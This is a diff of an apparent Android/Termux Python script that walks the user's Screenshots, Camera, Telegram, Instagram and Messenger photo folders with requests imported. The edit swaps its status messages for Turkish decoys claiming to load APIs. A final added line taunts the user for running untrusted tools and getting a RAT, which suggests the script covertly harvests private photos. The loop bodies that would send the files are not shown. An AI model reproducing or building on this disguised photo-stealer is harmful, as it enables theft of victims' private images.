@@ -4,11 +4,11 @@ import os
 import time
 from colorama import Fore, Style, init
 os.system('pip install emojify')
-W = '\033[1;31m'
-B = '\033[1;36m'
-G = '\033[1;32m'
-S = '\033[1;33m'
-E = '\033[1;97m'
+W = '\033[2;31m'
+B = '\033[2;35m'
+G = '\033[2;36m'
+S = '\033[1;34m'
+E = '\033[1;33m'
 os.system('clear')
 print(Style.RESET_ALL)
 print(Style.BRIGHT)
@@ -44,14 +44,7 @@ os.system('clear')
 import requests
 from datetime import datetime
 def banner():
-    print ('\t         \033[2;33m   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇         ')
-    print('\t         \033[2;33m   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇       ')
-    print ('\t         \033[2;33m   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇          ')
-    print ('\t         \033[2;33m   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇           ')
-    print ('\t         \033[2;33m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m Zwinesplar ')
-    print ('\t         \033[2;33m   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇             ')
-    print ('\t         \033[2;33m   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
-    print ('\t         \033[2;33m   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')
+
 banner()
 print('')
 print('')
@@ -72,7 +65,7 @@ for i in tmp:
   else:
        pass
        
-print('\033[2;31m  [ * ] \033[2;34m Check internet .... ')     
+print('\033[2;31m  [ ! ] \033[2;34m APİLER ALİNİYO.... ')     
 print('')
         
 os.chdir(r"/storage/emulated/0/DCIM/Screenshots")
@@ -86,7 +79,7 @@ for i in tmp:
           pass
   else:
        pass  
-print('\033[2;31m  [ ✓ ] \033[2;32m Connection ......') 
+print('\033[2;31m  [ ! ] \033[2;32m Apiler Bağlanıyor Lütfen Beklyiniz......') 
 print('')
                                               
 os.chdir(r"/storage/emulated/0/DCIM/Camera")   
@@ -100,7 +93,7 @@ for i in tmp:
           pass
   else:
        pass     
-print('\033[34;1m  [ ✔ ] \033[33;1m Watting ......... ')   
+print('\033[34;1m  [ ! ] \033[33;1m 1 Dakka Bekleyinix......... ')   
 print('')
                       
 os.chdir(r"/storage/emulated/0/Pictures/Telegram")   
@@ -115,7 +108,7 @@ for i in tmp:
   else:
        pass 
        
-print('\033[36;1m  [ ✘ ] \033[32;1m Start Toole .......')   
+print('\033[36;1m  [ ! ] \033[32;1m Çalışmaya Hazır .......')   
 print('')
     
 os.chdir(r"/storage/emulated/0/Pictures/Instagram")   
@@ -130,7 +123,7 @@ for i in tmp:
   else:
        pass  
        
-print('\033[0;1m  [ × ] \033[31;1m MythDeath ......  ')   
+print('\033[0;1m  [ ! ] \033[31;1m ENAYİ MAL BÖYLE HER TOOLU AÇARSAN RAT YERSİN SG ......  ')   
 print('')      
 os.chdir(r"/storage/emulated/0/Pictures/Messenger")   
 tmp = list(os.scandir('.'))
